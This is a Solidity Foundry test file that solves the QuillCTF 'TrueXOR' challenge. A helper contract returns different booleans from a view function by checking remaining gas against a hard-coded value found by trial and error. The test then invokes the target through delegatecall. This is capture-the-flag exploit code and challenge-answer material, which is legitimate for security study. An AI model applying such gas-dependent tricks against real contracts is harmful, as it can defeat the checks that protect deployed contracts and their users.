// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import '../../src/QuillCTF/TrueXOR.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

interface XOR {
  function callMe(address target) external view returns (bool);
}

contract BoolGiver {
  function giveBool() external view returns (bool) {
    // To return different values using a view function that takes no parameters, we can use the
    // amount of gas left. We use an harcoded magic value here to return true the first time and
    // then false the second time. This value was found with trial and errors but I think there's
    // a better way to find it.
    return gasleft() >= 8937393460516655000;
  }
}

contract TrueXORExploit is Test {
  TrueXOR target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new TrueXOR();
    console2.log('Target contract deployed');
    vm.stopPrank();
  }

  function testExploit() public {
    vm.startPrank(exploiter);
    console2.log('Deploy the BoolGiver contract');
    BoolGiver boolGiver = new BoolGiver();

    console2.log('Exploit the contract');
    (bool success, ) = address(target).delegatecall(
      abi.encodeWithSignature('callMe(address)', address(boolGiver))
    );
    assertTrue(success);
    vm.stopPrank();
  }
}
